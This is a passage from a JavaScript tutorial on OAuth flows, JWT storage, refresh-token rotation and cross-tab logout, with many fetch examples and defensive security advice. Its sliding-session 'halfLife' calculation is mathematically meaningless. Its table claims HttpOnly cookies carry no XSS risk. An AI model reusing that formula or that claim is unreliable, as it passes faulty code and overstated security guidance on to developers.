    body: JSON.stringify(updates)
  });

  return await response.json();
}
```

### JWT Bearer Token Flow

Using JWT assertions for authorization:

```javascript
async function createJWTAssertion(clientId, tokenEndpoint, privateKey) {
  const header = {
    alg: 'RS256',
    typ: 'JWT'
  };

  const payload = {
    iss: clientId,
    sub: clientId,
    aud: tokenEndpoint,
    exp: Math.floor(Date.now() / 1000) + 3600,
    iat: Math.floor(Date.now() / 1000),
    jti: generateRandomId()
  };

  // Sign JWT (requires crypto library or Web Crypto API)
  const token = await signJWT(header, payload, privateKey);
  return token;
}

async function getTokenWithJWTBearer(tokenEndpoint, assertion) {
  const response = await fetch(tokenEndpoint, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: new URLSearchParams({
      grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
      assertion: assertion,
      scope: 'api:read api:write'
    })
  });

  return await response.json();
}
```

### Token Exchange (RFC 8693)

Exchange one token for another:

```javascript
async function exchangeToken(options) {
  const {
    tokenEndpoint,
    subjectToken,
    subjectTokenType = 'urn:ietf:params:oauth:token-type:access_token',
    requestedTokenType = 'urn:ietf:params:oauth:token-type:access_token',
    resource,
    audience,
    scope
  } = options;

  const response = await fetch(tokenEndpoint, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: new URLSearchParams({
      grant_type: 'urn:ietf:params:oauth:grant-type:token-exchange',
      subject_token: subjectToken,
      subject_token_type: subjectTokenType,
      requested_token_type: requestedTokenType,
      ...(resource && { resource }),
      ...(audience && { audience }),
      ...(scope && { scope })
    })
  });

  const data = await response.json();
  // Returns: access_token, issued_token_type, token_type, expires_in, scope
  return data;
}

// Example: Exchange user token for service token
async function getServiceToken(userToken) {
  return exchangeToken({
    tokenEndpoint: 'https://auth-server.com/token',
    subjectToken: userToken,
    audience: 'https://backend-service.com',
    scope: 'service:read service:write'
  });
}
```

### Pushed Authorization Requests (PAR)

Enhanced security by pushing request parameters directly to authorization server:

```javascript
async function pushAuthorizationRequest(parEndpoint, params) {
  const credentials = btoa(`${clientId}:${clientSecret}`);
  
  const response = await fetch(parEndpoint, {
    method: 'POST',
    headers: {
      'Authorization': `Basic ${credentials}`,
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: new URLSearchParams({
      response_type: params.responseType || 'code',
      client_id: params.clientId,
      redirect_uri: params.redirectUri,
      scope: params.scope,
      state: params.state,
      code_challenge: params.codeChallenge,
      code_challenge_method: params.codeChallengeMethod,
      ...params.additional
    })
  });

  const data = await response.json();
  // Returns: request_uri, expires_in
  return data;
}

async function authorizeWithPAR() {
  // Push authorization request
  const parResponse = await pushAuthorizationRequest(
    'https://auth-server.com/par',
    {
      clientId: 'your_client_id',
      redirectUri: 'https://your-app.com/callback',
      scope: 'read write',
      state: generateState(),
      codeChallenge: await generateCodeChallenge(codeVerifier),
      codeChallengeMethod: 'S256'
    }
  );

  // Redirect with request_uri
  const authUrl = new URL('https://auth-server.com/authorize');
  authUrl.searchParams.set('client_id', 'your_client_id');
  authUrl.searchParams.set('request_uri', parResponse.request_uri);
  
  window.location.href = authUrl.toString();
}
```

---

## JWT Handling

### Token Storage Strategies

**localStorage vs sessionStorage vs Memory**

Storing JWTs in `localStorage` persists tokens across browser sessions but exposes them to XSS attacks since any JavaScript on the page can access them. `sessionStorage` provides similar accessibility but clears on tab close. In-memory storage (JavaScript variables) offers better XSS protection but tokens are lost on page refresh.

**HttpOnly Cookies**

The most secure approach stores JWTs in HttpOnly cookies set by the server. These cookies are inaccessible to JavaScript, protecting against XSS. The browser automatically includes them in requests to the same domain. This requires backend cooperation to set the `Set-Cookie` header with `HttpOnly`, `Secure`, and `SameSite` attributes.

### Sending JWT in Requests

**Authorization Header Pattern**

```javascript
fetch('https://api.example.com/protected', {
  headers: {
    'Authorization': `Bearer ${token}`,
    'Content-Type': 'application/json'
  }
})
```

The `Bearer` scheme is the standard for JWT transmission. The server extracts the token from the header, verifies the signature, and validates claims before processing the request.

**Credentials with Cookies**

```javascript
fetch('https://api.example.com/protected', {
  credentials: 'include',
  headers: {
    'Content-Type': 'application/json'
  }
})
```

The `credentials: 'include'` option instructs fetch to send cookies cross-origin. For same-origin requests, use `'same-origin'`. The server must respond with appropriate CORS headers including `Access-Control-Allow-Credentials: true`.

### Token Refresh Mechanisms

**Refresh Token Flow**

Access tokens have short lifespans (5-15 minutes typically). Refresh tokens, stored more securely, have longer validity. When an access token expires (401 response), the client requests a new one using the refresh token:

```javascript
async function refreshAccessToken(refreshToken) {
  const response = await fetch('https://api.example.com/auth/refresh', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ refreshToken })
  });
  
  if (!response.ok) throw new Error('Refresh failed');
  
  const { accessToken, refreshToken: newRefreshToken } = await response.json();
  return { accessToken, refreshToken: newRefreshToken };
}
```

**Automatic Retry with Refresh**

Intercepting 401 responses to automatically refresh and retry:

```javascript
async function fetchWithAuth(url, options = {}) {
  let token = getStoredToken();
  
  let response = await fetch(url, {
    ...options,
    headers: {
      ...options.headers,
      'Authorization': `Bearer ${token}`
    }
  });
  
  if (response.status === 401) {
    // Token expired, attempt refresh
    const refreshToken = getStoredRefreshToken();
    const tokens = await refreshAccessToken(refreshToken);
    storeTokens(tokens);
    
    // Retry original request with new token
    response = await fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        'Authorization': `Bearer ${tokens.accessToken}`
      }
    });
  }
  
  return response;
}
```

**Proactive Refresh**

Checking token expiration before requests prevents failed requests:

```javascript
function isTokenExpired(token) {
  const payload = JSON.parse(atob(token.split('.')[1]));
  const expirationTime = payload.exp * 1000; // Convert to milliseconds
  const bufferTime = 60000; // Refresh 1 minute before expiry
  return Date.now() >= (expirationTime - bufferTime);
}

async function getValidToken() {
  let token = getStoredToken();
  
  if (isTokenExpired(token)) {
    const refreshToken = getStoredRefreshToken();
    const tokens = await refreshAccessToken(refreshToken);
    storeTokens(tokens);
    token = tokens.accessToken;
  }
  
  return token;
}
```

### Handling Multiple Concurrent Requests

**Race Condition Prevention**

When multiple requests detect token expiration simultaneously, you need to ensure only one refresh request occurs:

```javascript
let refreshPromise = null;

async function getValidToken() {
  let token = getStoredToken();
  
  if (isTokenExpired(token)) {
    // If refresh already in progress, wait for it
    if (refreshPromise) {
      await refreshPromise;
      return getStoredToken();
    }
    
    // Start new refresh
    refreshPromise = refreshAccessToken(getStoredRefreshToken())
      .then(tokens => {
        storeTokens(tokens);
        refreshPromise = null;
        return tokens.accessToken;
      })
      .catch(error => {
        refreshPromise = null;
        throw error;
      });
    
    return refreshPromise;
  }
  
  return token;
}
```

**Request Queue Pattern**

Queuing requests during token refresh:

```javascript
class AuthQueue {
  constructor() {
    this.isRefreshing = false;
    this.failedQueue = [];
  }
  
  processQueue(error, token = null) {
    this.failedQueue.forEach(promise => {
      if (error) {
        promise.reject(error);
      } else {
        promise.resolve(token);
      }
    });
    
    this.failedQueue = [];
  }
  
  async fetchWithAuth(url, options = {}) {
    let token = getStoredToken();
    
    const response = await fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        'Authorization': `Bearer ${token}`
      }
    });
    
    if (response.status === 401) {
      if (this.isRefreshing) {
        // Wait in queue
        return new Promise((resolve, reject) => {
          this.failedQueue.push({ resolve, reject });
        }).then(newToken => {
          return fetch(url, {
            ...options,
            headers: {
              ...options.headers,
              'Authorization': `Bearer ${newToken}`
            }
          });
        });
      }
      
      this.isRefreshing = true;
      
      try {
        const tokens = await refreshAccessToken(getStoredRefreshToken());
        storeTokens(tokens);
        this.processQueue(null, tokens.accessToken);
        
        return fetch(url, {
          ...options,
          headers: {
            ...options.headers,
            'Authorization': `Bearer ${tokens.accessToken}`
          }
        });
      } catch (error) {
        this.processQueue(error, null);
        throw error;
      } finally {
        this.isRefreshing = false;
      }
    }
    
    return response;
  }
}
```

### Token Validation Client-Side

**Signature Verification Limitations**

[Inference] Client-side signature verification using Web Crypto API is possible but provides limited security value since an attacker controlling the client can bypass it. True validation occurs server-side.

**Claims Extraction and Checking**

```javascript
function parseJWT(token) {
  const [header, payload, signature] = token.split('.');
  
  return {
    header: JSON.parse(atob(header)),
    payload: JSON.parse(atob(payload)),
    signature
  };
}

function validateClaims(payload) {
  const now = Math.floor(Date.now() / 1000);
  
  // Check expiration
  if (payload.exp && payload.exp < now) {
    return { valid: false, reason: 'Token expired' };
  }
  
  // Check not before
  if (payload.nbf && payload.nbf > now) {
    return { valid: false, reason: 'Token not yet valid' };
  }
  
  // Check issuer
  const expectedIssuer = 'https://your-auth-server.com';
  if (payload.iss !== expectedIssuer) {
    return { valid: false, reason: 'Invalid issuer' };
  }
  
  // Check audience
  const expectedAudience = 'your-api-identifier';
  if (payload.aud !== expectedAudience) {
    return { valid: false, reason: 'Invalid audience' };
  }
  
  return { valid: true };
}
```

### Error Handling Patterns

**Distinguishing Auth Errors**

```javascript
class AuthError extends Error {
  constructor(message, type) {
    super(message);
    this.name = 'AuthError';
    this.type = type; // 'expired', 'invalid', 'refresh_failed'
  }
}

async function handleAuthResponse(response) {
  if (response.status === 401) {
    const errorData = await response.json().catch(() => ({}));
    
    if (errorData.code === 'token_expired') {
      throw new AuthError('Token expired', 'expired');
    } else if (errorData.code === 'invalid_token') {
      throw new AuthError('Invalid token', 'invalid');
    }
    
    throw new AuthError('Authentication failed', 'unknown');
  }
  
  if (response.status === 403) {
    throw new AuthError('Insufficient permissions', 'forbidden');
  }
  
  return response;
}
```

**Logout on Fatal Auth Errors**

```javascript
async function fetchWithAuthAndErrorHandling(url, options = {}) {
  try {
    return await fetchWithAuth(url, options);
  } catch (error) {
    if (error instanceof AuthError) {
      if (error.type === 'refresh_failed' || error.type === 'invalid') {
        // Clear tokens and redirect to login
        clearTokens();
        window.location.href = '/login';
        throw error;
      }
    }
    throw error;
  }
}
```

### CORS Considerations

**Preflight Handling**

Requests with custom `Authorization` headers trigger CORS preflight (OPTIONS request). The server must respond with:

```
Access-Control-Allow-Origin: https://your-frontend.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Authorization, Content-Type
Access-Control-Max-Age: 86400
```

**Credentials and Wildcard Origins**

When using `credentials: 'include'`, the server cannot use `Access-Control-Allow-Origin: *`. It must specify the exact origin. This prevents accidental credential leakage to untrusted origins.

### Token Revocation Handling

**Server-Side Revocation Detection**

If the server revokes a token (user logout, security incident), subsequent requests with that token fail with 401. The client must treat this as requiring reauthentication:

```javascript
async function fetchWithAuth(url, options = {}) {
  try {
    const token = await getValidToken();
    const response = await fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        'Authorization': `Bearer ${token}`
      }
    });
    
    if (response.status === 401) {
      const errorData = await response.json().catch(() => ({}));
      
      // Token revoked or refresh token invalid
      if (errorData.code === 'token_revoked') {
        clearTokens();
        redirectToLogin();
        throw new AuthError('Session invalidated', 'revoked');
      }
      
      // Try refresh
      return await attemptRefreshAndRetry(url, options);
    }
    
    return response;
  } catch (error) {
    throw error;
  }
}
```

### Refresh Token Rotation

**One-Time Use Refresh Tokens**

Security-conscious implementations issue a new refresh token with each access token refresh, invalidating the old one:

```javascript
async function refreshAccessToken(currentRefreshToken) {
  const response = await fetch('https://api.example.com/auth/refresh', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ refreshToken: currentRefreshToken })
  });
  
  if (!response.ok) {
    if (response.status === 401) {
      // Refresh token invalid or expired
      clearTokens();
      redirectToLogin();
    }
    throw new Error('Refresh failed');
  }
  
  const { accessToken, refreshToken: newRefreshToken } = await response.json();
  
  // Store both new tokens
  storeTokens({ accessToken, refreshToken: newRefreshToken });
  
  return { accessToken, refreshToken: newRefreshToken };
}
```

**Refresh Token Reuse Detection**

If a refresh token is used twice (possible replay attack), the server invalidates all tokens for that user. The client receives a specific error:

```javascript
async function refreshAccessToken(currentRefreshToken) {
  try {
    const response = await fetch('https://api.example.com/auth/refresh', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ refreshToken: currentRefreshToken })
    });
    
    if (response.status === 401) {
      const errorData = await response.json();
      
      if (errorData.code === 'refresh_token_reuse_detected') {
        // Security incident - clear everything and force reauthentication
        clearAllUserData();
        alert('Security alert: Please log in again');
        redirectToLogin();
        throw new AuthError('Token reuse detected', 'security_violation');
      }
    }
    
    // ... rest of refresh logic
  } catch (error) {
    throw error;
  }
}
```

### Silent Authentication

**Hidden iframe Approach**

For applications using OAuth/OIDC with HttpOnly cookies, silent token renewal uses a hidden iframe:

```javascript
function silentTokenRenewal() {
  return new Promise((resolve, reject) => {
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    
    const timeoutId = setTimeout(() => {
      cleanup();
      reject(new Error('Silent renewal timeout'));
    }, 10000);
    
    function cleanup() {
      clearTimeout(timeoutId);
      window.removeEventListener('message', handleMessage);
      document.body.removeChild(iframe);
    }
    
    function handleMessage(event) {
      if (event.origin !== 'https://your-auth-server.com') return;
      
      if (event.data.type === 'renewal_success') {
        cleanup();
        resolve(event.data.token);
      } else if (event.data.type === 'renewal_failed') {
        cleanup();
        reject(new Error('Silent renewal failed'));
      }
    }
    
    window.addEventListener('message', handleMessage);
    document.body.appendChild(iframe);
    iframe.src = 'https://your-auth-server.com/auth/silent?client_id=your-client-id';
  });
}
```

### Token Payload Inspection

**Role-Based Access Control**

```javascript
function getUserRoles(token) {
  const { payload } = parseJWT(token);
  return payload.roles || [];
}

function hasPermission(token, requiredRole) {
  const roles = getUserRoles(token);
  return roles.includes(requiredRole);
}

async function fetchProtectedResource(url, requiredRole) {
  const token = await getValidToken();
  
  if (!hasPermission(token, requiredRole)) {
    throw new AuthError('Insufficient permissions', 'forbidden');
  }
  
  return fetch(url, {
    headers: {
      'Authorization': `Bearer ${token}`
    }
  });
}
```

**Custom Claims Usage**

```javascript
function extractCustomClaims(token) {
  const { payload } = parseJWT(token);
  
  return {
    userId: payload.sub,
    email: payload.email,
    organizationId: payload.org_id,
    subscription: payload.subscription_tier,
    permissions: payload.permissions || []
  };
}
```

### Background Token Refresh

**Scheduled Refresh**

```javascript
class TokenRefreshScheduler {
  constructor() {
    this.timeoutId = null;
  }
  
  scheduleRefresh(token) {
    this.cancelRefresh();
    
    const { payload } = parseJWT(token);
    const expirationTime = payload.exp * 1000;
    const refreshTime = expirationTime - (5 * 60 * 1000); // 5 minutes before expiry
    const delay = refreshTime - Date.now();
    
    if (delay > 0) {
      this.timeoutId = setTimeout(async () => {
        try {
          const refreshToken = getStoredRefreshToken();
          const tokens = await refreshAccessToken(refreshToken);
          storeTokens(tokens);
          this.scheduleRefresh(tokens.accessToken);
        } catch (error) {
          console.error('Background refresh failed:', error);
          redirectToLogin();
        }
      }, delay);
    }
  }
  
  cancelRefresh() {
    if (this.timeoutId) {
      clearTimeout(this.timeoutId);
      this.timeoutId = null;
    }
  }
}
```

### Fetch Wrapper Architectures

**Centralized Auth Fetch**

```javascript
class AuthenticatedFetch {
  constructor(baseURL, tokenManager) {
    this.baseURL = baseURL;
    this.tokenManager = tokenManager;
  }
  
  async fetch(endpoint, options = {}) {
    const token = await this.tokenManager.getValidToken();
    const url = `${this.baseURL}${endpoint}`;
    
    const response = await fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        'Authorization': `Bearer ${token}`,
        'Content-Type': 'application/json'
      }
    });
    
    if (response.status === 401) {
      const refreshed = await this.tokenManager.handleExpiredToken();
      if (refreshed) {
        return this.fetch(endpoint, options);
      }
    }
    
    return response;
  }
  
  async get(endpoint, options = {}) {
    return this.fetch(endpoint, { ...options, method: 'GET' });
  }
  
  async post(endpoint, data, options = {}) {
    return this.fetch(endpoint, {
      ...options,
      method: 'POST',
      body: JSON.stringify(data)
    });
  }
  
  async put(endpoint, data, options = {}) {
    return this.fetch(endpoint, {
      ...options,
      method: 'PUT',
      body: JSON.stringify(data)
    });
  }
  
  async delete(endpoint, options = {}) {
    return this.fetch(endpoint, { ...options, method: 'DELETE' });
  }
}
```

### Security Best Practices

**Token Storage Security Comparison**

|Storage Method|XSS Vulnerability|CSRF Vulnerability|Persistence|Recommended|
|---|---|---|---|---|
|localStorage|High|Low|Yes|No|
|sessionStorage|High|Low|Session only|No|
|Memory|Low|Low|No|Only for SPAs|
|HttpOnly Cookie|None|High (mitigated by SameSite)|Configurable|Yes|

**Mitigating XSS with CSP**

Content Security Policy headers reduce XSS risk even when tokens are in localStorage:

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'; connect-src 'self' https://api.example.com
```

**Mitigating CSRF with SameSite**

When using HttpOnly cookies, the `SameSite` attribute prevents CSRF:

```
Set-Cookie: refreshToken=...; HttpOnly; Secure; SameSite=Strict; Path=/auth/refresh
```

`SameSite=Strict` blocks cookies on all cross-site requests. `SameSite=Lax` allows cookies on top-level GET requests (following links).

### Logout Implementation

**Client-Side Token Clearing**

```javascript
async function logout() {
  const refreshToken = getStoredRefreshToken();
  
  // Notify server to revoke tokens
  try {
    await fetch('https://api.example.com/auth/logout', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ refreshToken })
    });
  } catch (error) {
    console.error('Server logout failed:', error);
  }
  
  // Clear local tokens regardless of server response
  clearTokens();
  
  // Cancel any scheduled refreshes
  tokenRefreshScheduler.cancelRefresh();
  
  // Redirect to login
  window.location.href = '/login';
}
```

**Logout Across Tabs**

Using localStorage events to synchronize logout:

```javascript
window.addEventListener('storage', (event) => {
  if (event.key === 'logout_event') {
    // Another tab logged out
    clearTokens();
    window.location.href = '/login';
  }
});

function logout() {
  // ... server logout logic
  clearTokens();
  localStorage.setItem('logout_event', Date.now().toString());
  localStorage.removeItem('logout_event');
  window.location.href = '/login';
}
```

### Token Transmission Security

**HTTPS Enforcement**

[Inference] JWTs transmitted over HTTP can be intercepted. Always use HTTPS for authentication endpoints and API calls.

**Avoiding URL Parameters**

Never pass JWTs in URL query parameters as they appear in browser history, server logs, and referrer headers:

```javascript
// WRONG
fetch(`https://api.example.com/data?token=${jwt}`);

// CORRECT
fetch('https://api.example.com/data', {
  headers: { 'Authorization': `Bearer ${jwt}` }
});
```

---

## Refresh Token Patterns

### Basic Refresh Token Flow

The standard refresh token pattern involves two types of tokens working together:

**Access Token:**

- Short-lived (typically 15 minutes to 1 hour)
- Included in every API request
- Stored in memory or sessionStorage
- Contains user claims and permissions

**Refresh Token:**

- Long-lived (days to months)
- Used only to obtain new access tokens
- Stored securely (httpOnly cookie or secure storage)
- Single-purpose: token renewal

**Basic implementation:**

```javascript
let accessToken = null;
let refreshToken = null;

async function login(credentials) {
  const response = await fetch('https://api.example.com/auth/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(credentials)
  });
  
  const data = await response.json();
  accessToken = data.accessToken;
  refreshToken = data.refreshToken;
  
  return data;
}

async function refreshAccessToken() {
  const response = await fetch('https://api.example.com/auth/refresh', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ refreshToken })
  });
  
  const data = await response.json();
  accessToken = data.accessToken;
  
  // Some implementations also rotate refresh tokens
  if (data.refreshToken) {
    refreshToken = data.refreshToken;
  }
  
  return data;
}
```

### Automatic Token Refresh with Interceptor Pattern

This pattern intercepts failed requests and automatically retries after refreshing:

```javascript
async function fetchWithAuth(url, options = {}) {
  // Add access token to request
  const headers = {
    ...options.headers,
    'Authorization': `Bearer ${accessToken}`
  };
  
  let response = await fetch(url, { ...options, headers });
  
  // If 401, try refreshing token
  if (response.status === 401) {
    await refreshAccessToken();
    
    // Retry original request with new token
    headers.Authorization = `Bearer ${accessToken}`;
    response = await fetch(url, { ...options, headers });
  }
  
  return response;
}

// Usage
const data = await fetchWithAuth('https://api.example.com/user/profile')
  .then(res => res.json());
```

### Proactive Refresh Pattern

Refresh tokens before they expire, rather than waiting for 401 errors:

```javascript
let tokenExpiryTime = null;
let refreshPromise = null;

function setTokens(accessToken, expiresIn) {
  // expiresIn is typically in seconds
  tokenExpiryTime = Date.now() + (expiresIn * 1000);
  
  // Schedule refresh before expiry (e.g., 5 minutes before)
  const refreshTime = (expiresIn - 300) * 1000;
  setTimeout(proactiveRefresh, refreshTime);
}

async function proactiveRefresh() {
  try {
    const data = await refreshAccessToken();
    setTokens(data.accessToken, data.expiresIn);
  } catch (error) {
    // Handle refresh failure (e.g., logout user)
    handleAuthFailure(error);
  }
}

async function fetchWithAuth(url, options = {}) {
  // Check if token is about to expire
  const timeUntilExpiry = tokenExpiryTime - Date.now();
  const fiveMinutes = 5 * 60 * 1000;
  
  if (timeUntilExpiry < fiveMinutes) {
    // Ensure only one refresh happens at a time
    if (!refreshPromise) {
      refreshPromise = refreshAccessToken().finally(() => {
        refreshPromise = null;
      });
    }
    await refreshPromise;
  }
  
  const headers = {
    ...options.headers,
    'Authorization': `Bearer ${accessToken}`
  };
  
  return fetch(url, { ...options, headers });
}
```

### Refresh Token Rotation

A security pattern where each refresh generates a new refresh token:

```javascript
async function refreshAccessToken() {
  const response = await fetch('https://api.example.com/auth/refresh', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ refreshToken })
  });
  
  if (!response.ok) {
    throw new Error('Refresh failed');
  }
  
  const data = await response.json();
  
  // Update both tokens
  accessToken = data.accessToken;
  refreshToken = data.newRefreshToken; // Old refresh token is now invalid
  
  // Persist new refresh token
  await secureStorage.set('refreshToken', data.newRefreshToken);
  
  return data;
}
```

**Server-side rotation logic:**

- When refresh token is used, invalidate it immediately
- Issue new refresh token with new expiry
- Track token families to detect replay attacks
- If old token is reused, invalidate entire token family

### Sliding Session Pattern

Extends session lifetime with each activity:

```javascript
let lastActivity = Date.now();
const activityThreshold = 5 * 60 * 1000; // 5 minutes

async function fetchWithAuth(url, options = {}) {
  const now = Date.now();
  
  // If user has been active recently, extend session
  if (now - lastActivity < activityThreshold) {
    const timeUntilExpiry = tokenExpiryTime - now;
    const halfLife = (tokenExpiryTime - (tokenExpiryTime - lastActivity)) / 2;
    
    if (timeUntilExpiry < halfLife) {
      // Refresh to extend session
      await refreshAccessToken();
    }
  }
  
  lastActivity = now;
  
  const headers = {
    ...options.headers,
    'Authorization': `Bearer ${accessToken}`
  };
  
  return fetch(url, { ...options, headers });
}
```

### Silent Refresh with Hidden Iframe (OAuth2)

Used in browser-based OAuth2 flows:

```javascript
function silentRefresh() {
  return new Promise((resolve, reject) => {
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    
    // Set up message listener
    const messageHandler = (event) => {
      if (event.origin !== 'https://auth.example.com') return;
      
      window.removeEventListener('message', messageHandler);
      document.body.removeChild(iframe);
      
      if (event.data.error) {
        reject(new Error(event.data.error));
      } else {
        accessToken = event.data.accessToken;
        resolve(event.data);
      }
    };
    
    window.addEventListener('message', messageHandler);
    
    // Load authorization endpoint with prompt=none
    iframe.src = 'https://auth.example.com/authorize?prompt=none&...';
    document.body.appendChild(iframe);
    
    // Timeout after 10 seconds
    setTimeout(() => {
      window.removeEventListener('message', messageHandler);
      document.body.removeChild(iframe);
      reject(new Error('Silent refresh timeout'));
    }, 10000);
  });
}
```

### Concurrent Request Handling

Prevent multiple simultaneous refresh requests:

```javascript
let refreshPromise = null;

async function getValidAccessToken() {
  // If already refreshing, wait for that to complete
  if (refreshPromise) {
    return refreshPromise;
  }
  
  // Check if current token is valid
  if (isTokenValid(accessToken)) {
    return accessToken;
  }
  
  // Start refresh and cache the promise
  refreshPromise = refreshAccessToken()
    .then(data => {
      accessToken = data.accessToken;
      return accessToken;
    })
    .finally(() => {
      refreshPromise = null;
    });
  
  return refreshPromise;
}

async function fetchWithAuth(url, options = {}) {
  const token = await getValidAccessToken();
  
  const headers = {
    ...options.headers,
    'Authorization': `Bearer ${token}`
  };
  
  return fetch(url, { ...options, headers });
}
```

### Storage Strategies

**Memory-only (most secure for access tokens):**

```javascript
// Access token in closure/memory
let accessToken = null;

// Lost on page refresh, requires re-authentication
```

**sessionStorage (tab-scoped):**

```javascript
function setAccessToken(token) {
  sessionStorage.setItem('accessToken', token);
}

function getAccessToken() {
  return sessionStorage.getItem('accessToken');
}

// Lost when tab closes
// Not shared across tabs
```

**localStorage (persistent, cross-tab):**

```javascript
function setRefreshToken(token) {
  localStorage.setItem('refreshToken', token);
}

function getRefreshToken() {
  return localStorage.getItem('refreshToken');
}

// Persists across sessions
// Shared across tabs
// Vulnerable to XSS
```

**httpOnly Cookies (most secure for refresh tokens):**

```javascript
// Server sets cookie
res.cookie('refreshToken', token, {
  httpOnly: true,  // Not accessible via JavaScript
  secure: true,    // HTTPS only
  sameSite: 'strict',
  maxAge: 7 * 24 * 60 * 60 * 1000 // 7 days
});

// Client automatically sends cookie
async function refreshAccessToken() {
  const response = await fetch('https://api.example.com/auth/refresh', {
    method: 'POST',
    credentials: 'include' // Include cookies
  });
  
  const data = await response.json();
  return data.accessToken;
}
```

### Error Handling and Recovery

```javascript
async function fetchWithAuth(url, options = {}) {
  try {
    const token = await getValidAccessToken();
    
    const headers = {
      ...options.headers,
      'Authorization': `Bearer ${token}`
    };
    
    const response = await fetch(url, { ...options, headers });
    
    if (response.status === 401) {
      // Try refresh one more time
      await refreshAccessToken();
      
      const retryHeaders = {
        ...options.headers,
        'Authorization': `Bearer ${accessToken}`
      };
      
      const retryResponse = await fetch(url, { ...options, headers: retryHeaders });
      
      if (retryResponse.status === 401) {
        // Refresh token invalid or expired
        handleLogout();
        throw new Error('Authentication failed');
      }
      
      return retryResponse;
    }
    
    return response;
    
  } catch (error) {
    if (error.message.includes('refresh')) {
      // Refresh token expired or invalid
      handleLogout();
    }
    throw error;
  }
}

function handleLogout() {
  accessToken = null;
  refreshToken = null;
  localStorage.removeItem('refreshToken');
  sessionStorage.clear();
  
  // Redirect to login
  window.location.href = '/login';
}
```

### Token Refresh with Retry Logic

```javascript
async function refreshWithRetry(maxRetries = 3, delay = 1000) {
  for (let attempt = 0; attempt < maxRetries; attempt++) {
    try {
      return await refreshAccessToken();
    } catch (error) {
      const isLastAttempt = attempt === maxRetries - 1;
      
      if (isLastAttempt) {
        throw error;
      }
      
      // Exponential backoff
      await new Promise(resolve => 
        setTimeout(resolve, delay * Math.pow(2, attempt))
      );
    }
  }
}
```

### Background Refresh Worker

Using Web Workers for token management:

```javascript
// worker.js
let accessToken = null;
let refreshToken = null;
let refreshTimer = null;

self.addEventListener('message', async (event) => {
  const { type, payload } = event.data;
  
  switch (type) {
    case 'INIT':
      accessToken = payload.accessToken;
      refreshToken = payload.refreshToken;
      scheduleRefresh(payload.expiresIn);
      break;
      
    case 'GET_TOKEN':
      self.postMessage({ type: 'TOKEN', token: accessToken });
      break;
      
    case 'REFRESH':
      await performRefresh();
      break;
  }
});

async function performRefresh() {
  try {
    const response = await fetch('https://api.example.com/auth/refresh', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ refreshToken })
    });
    
    const data = await response.json();
    accessToken = data.accessToken;
    
    self.postMessage({ 
      type: 'REFRESHED', 
      accessToken: data.accessToken 
    });
    
    scheduleRefresh(data.expiresIn);
  } catch (error) {
    self.postMessage({ type: 'REFRESH_FAILED', error: error.message });
  }
}

function scheduleRefresh(expiresIn) {
  clearTimeout(refreshTimer);
  // Refresh 5 minutes before expiry
  const refreshTime = (expiresIn - 300) * 1000;
  refreshTimer = setTimeout(performRefresh, refreshTime);
}

// main.js
const tokenWorker = new Worker('worker.js');

tokenWorker.postMessage({
  type: 'INIT',
  payload: { accessToken, refreshToken, expiresIn: 3600 }
});

tokenWorker.addEventListener('message', (event) => {
  const { type, token, error } = event.data;
  
  if (type === 'REFRESHED') {
    accessToken = token;
  } else if (type === 'REFRESH_FAILED') {
    handleLogout();
  }
});
```

### Cross-Tab Synchronization

Synchronize tokens across multiple tabs:

```javascript
// Storage event listener for cross-tab communication
window.addEventListener('storage', (event) => {
  if (event.key === 'accessToken') {
    accessToken = event.newValue;
  }
  
  if (event.key === 'logout') {
    // Another tab logged out
    handleLogout();
  }
});

function setAccessToken(token) {
  accessToken = token;
  localStorage.setItem('accessToken', token);
  localStorage.setItem('tokenTimestamp', Date.now().toString());
}

function logout() {
  accessToken = null;
  localStorage.removeItem('accessToken');
  localStorage.setItem('logout', Date.now().toString());
}

// Using BroadcastChannel API (modern approach)
const authChannel = new BroadcastChannel('auth');

authChannel.addEventListener('message', (event) => {
  const { type, payload } = event.data;
  
  switch (type) {
    case 'TOKEN_REFRESHED':
      accessToken = payload.accessToken;
      break;
      
    case 'LOGOUT':
      handleLogout();
      break;
  }
});

function broadcastTokenRefresh(token) {
  authChannel.postMessage({
    type: 'TOKEN_REFRESHED',
    payload: { accessToken: token }
  });
}
```

### Refresh Token Security Best Practices

**Storage security:**

- Store refresh tokens in httpOnly cookies when possible
- Never store refresh tokens in localStorage for production apps
- Use secure, sameSite cookie attributes
- Encrypt tokens if storing in localStorage (though still not recommended)

**Network security:**

- Always use HTTPS for token transmission
- Implement refresh token rotation
- Set appropriate token lifetimes (access: 15min-1hr, refresh: 7-30 days)
- Use short-lived access tokens

**Detection and prevention:**

```javascript
// Track token usage to detect anomalies
async function refreshAccessToken() {
  const deviceFingerprint = await getDeviceFingerprint();
  
  const response = await fetch('https://api.example.com/auth/refresh', {
    method: 'POST',
    headers: { 
      'Content-Type': 'application/json',
      'X-Device-ID': deviceFingerprint
    },
    body: JSON.stringify({ refreshToken })
  });
  
  if (response.status === 403) {
    // Possible token theft detected
    handleSecurityEvent();
  }
  
  return response.json();
}
```

**Server-side validation:**

[Inference]: These patterns are commonly implemented but specific behavior depends on server implementation.

- Validate device/browser fingerprint
- Check IP address changes
- Implement token families for rotation
